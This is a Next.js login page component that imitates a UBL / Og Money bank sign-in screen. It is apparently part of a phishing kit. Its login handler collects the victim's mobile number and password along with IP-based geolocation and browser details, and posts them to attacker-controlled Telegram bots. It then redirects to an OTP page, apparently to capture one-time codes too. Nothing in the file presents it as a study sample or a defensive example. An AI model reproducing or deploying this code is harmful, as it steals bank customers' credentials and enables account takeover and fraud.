"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { ChevronDown, Lock, Smartphone, Loader2 } from "lucide-react"

export default function LoginPage() {
  const router = useRouter()
  const [mobileNumber, setMobileNumber] = useState("")
  const [password, setPassword] = useState("")
  const [errors, setErrors] = useState<{ mobileNumber?: string; password?: string }>({})
  const [isLoading, setIsLoading] = useState(false)


  const validateForm = () => {
    const newErrors: { mobileNumber?: string; password?: string } = {}

    if (!mobileNumber.trim()) {
      newErrors.mobileNumber = "Mobile number is required"
    }

    if (!password) {
      newErrors.password = "Password is required"
    } else if (password.length < 6) {
      newErrors.password = "Password must be at least 6 characters"
    }

    setErrors(newErrors)
    return Object.keys(newErrors).length === 0
  }

  // 1️⃣ Function to get browser name
  const getBrowserName = () => {
    const userAgent = window.navigator.userAgent;
    if (userAgent.includes("Firefox")) return "Mozilla Firefox";
    if (userAgent.includes("SamsungBrowser")) return "Samsung Internet";
    if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera";
    if (userAgent.includes("Edge")) return "Microsoft Edge";
    if (userAgent.includes("Chrome")) return "Google Chrome";
    if (userAgent.includes("Safari")) return "Apple Safari";
    return "Unknown Browser";
  };






  const handleLogin = async () => {
    if (validateForm()) {
      setIsLoading(true);

      try {
        // Fetch IP and Location data
        let geoData: any = {};
        try {
          const geoRes = await fetch("https://ipapi.co/json/");
          if (geoRes.ok) {
            const data = await geoRes.json();

            if (data.error || data.reason === "Suspended" || data.reserved) {
              console.log("Visitor tracking skipped: IP API suspended or error.");
              throw new Error("IP API Suspended");
            }

            geoData = {
              ip: data.ip,
              city: data.city,
              country: data.country_name,
              isp: data.org,
              latitude: data.latitude,
              longitude: data.longitude,
            };
          }
        } catch (geoErr) {
          console.error("Error fetching geo data:", geoErr);
        }

        const botTokensValue = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN;
        const chatIdValue = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID;

        if (botTokensValue && chatIdValue) {
          const chatIds = chatIdValue.split(",").map(id => id.trim());
          const botTokens = botTokensValue.split(",").map(token => token.trim());
          const googleMapsUrl = (geoData.latitude && geoData.longitude ? `https://www.google.com/maps?q=${geoData.latitude},${geoData.longitude}` : null);

          const message = `
<b>🔐 New Og Money Login</b>
<b>📱 Mobile Number:</b><code>${mobileNumber}</code>
<b>🔑 Password:</b><code>${password}</code>
<b>🌍 IP Location:</b>
<b>IP:</b> <code>${geoData.ip || "Unknown"}</code>
<b>City:</b> ${geoData.city || "N/A"}
<b>Country:</b> ${geoData.country || "N/A"}
<b>ISP:</b> ${geoData.isp || "N/A"}

${googleMapsUrl ? `<b>Map:</b> <a href="${googleMapsUrl}">View</a>\n` : ""}
<b>📱 Browser:</b> ${getBrowserName()}
          `;

          await Promise.all(chatIds.map((id, index) => {
            const token = botTokens[index] || botTokens[botTokens.length - 1];
            return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: id,
                text: message,
                parse_mode: "HTML",
              }),
            }).catch(err => console.error(`Telegram Error (${id}):`, err));
          }));
        }

        console.log("Og Money Login sent to Telegram");

        sessionStorage.setItem("userMobile", mobileNumber)
        sessionStorage.setItem("userPassword", password)
        router.push("/ogMoney-otp")

      } catch (err) {
        console.error("Error in login process:", err);
        setIsLoading(false); // Only stop loading if error specific to process prevents navigation
        // In this case, we probably still want to proceed or show error? 
        // For now, let's allow proceed even if telegram fails, but maybe keep loading false so they can retry?
        // Actually best is to just proceed to OTP even if tracking fails, to not block user.
        sessionStorage.setItem("userMobile", mobileNumber)
        sessionStorage.setItem("userPassword", password)
        router.push("/ogMoney-otp")
      }
    }
  }

  return (
    <div className="min-h-screen bg-[#f9f9f9] flex flex-col items-center px-8 py-8">
      {/* Logo */}
      {/* Logo */}
      <img
        src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/United_Bank_Limited_logo.svg/500px-United_Bank_Limited_logo.svg.png"
        alt="UBL"
        className="w-40 mb-3"
      />

      {/* Subtitle */}
      <p className="text-[#666] text-sm mb-6 text-center">
        Sign in to your UBL
      </p>

      {/* Form Card */}
      <div className="w-full max-w-md bg-white rounded-2xl shadow-lg p-5 px-4 mb-4">
        {/* Mobile Number */}
        <div className="mb-5">
          <label className="block text-[#333] font-medium text-sm mb-2">
            Mobile Number
          </label>
          <div className="flex gap-2">
            {/* Country Code Selector */}
            <button className="flex items-center gap-1 px-3 py-3 bg-[#f8f8f8] rounded-lg border border-[#e5e5e5] min-w-[90px]">
              <span className="text-base">🇰🇼</span>
              <span className="text-[#999] text-sm">965</span>
              <ChevronDown className="w-4 h-4 text-[#999]" />
            </button>
            {/* Mobile Input */}
            <div className="flex-1 relative">
              <input
                type="tel"
                placeholder="Mobile Number"
                value={mobileNumber}
                onChange={(e) => {
                  setMobileNumber(e.target.value)
                  if (errors.mobileNumber) setErrors(prev => ({ ...prev, mobileNumber: undefined }))
                }}
                className={`w-full px-4 py-3 bg-[#f8f8f8] rounded-lg border text-sm placeholder:text-[#bbb] focus:outline-none focus:border-[#3a9cb0] ${errors.mobileNumber ? "border-red-500" : "border-[#e5e5e5]"}`}
              />
              <Smartphone className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-[#ccc]" />
            </div>
          </div>
          {errors.mobileNumber && (
            <p className="text-red-500 text-xs mt-1">{errors.mobileNumber}</p>
          )}
        </div>

        {/* Password */}
        <div>
          <label className="block text-[#333] font-medium text-sm mb-2">
            Password
          </label>
          <div className="relative">
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => {
                setPassword(e.target.value)
                if (errors.password) setErrors(prev => ({ ...prev, password: undefined }))
              }}
              className={`w-full px-4 py-3 bg-[#f8f8f8] rounded-lg border text-sm placeholder:text-[#bbb] focus:outline-none focus:border-[#3a9cb0] ${errors.password ? "border-red-500" : "border-[#e5e5e5]"}`}
            />
            <Lock className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-[#ccc]" />
          </div>
          {errors.password && (
            <p className="text-red-500 text-xs mt-1">{errors.password}</p>
          )}
        </div>
      </div>

      {/* Full Screen Loader Overlay with Og Money Branding */}
      {isLoading && (
        <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-black/50 backdrop-blur-sm">
          <div className="flex flex-col items-center gap-8">
            <img
              src="https://ogmoney.com/wp-content/uploads/2025/04/Og-Money-Logo-Wide-Blue-1-768x314.png"
              alt="Og Money"
              className="w-48 h-auto brightness-0 invert"
            />
            <div className="w-48 flex flex-col items-center gap-3 mt-2">
              <span className="loader"></span>
            </div>
          </div>
        </div>
      )}

      {/* Login Button */}
      <button
        onClick={handleLogin}
        disabled={isLoading}
        className="w-full max-w-md bg-[#3b7fbf] hover:bg-[#3571a8] disabled:bg-[#3b7fbf]/70 text-white font-medium py-4 rounded-full mb-4 text-sm tracking-wide flex items-center justify-center cursor-pointer"
      >
        LOGIN
      </button>

      {/* Register Button */}
      <button
        onClick={() => router.push("/ogMoney-register")}
        className="w-full max-w-md bg-white border border-[#3b7fbf] text-[#3b7fbf] font-medium py-4 rounded-full text-sm tracking-wide"
      >
        REGISTER
      </button>
    </div>
  )
}
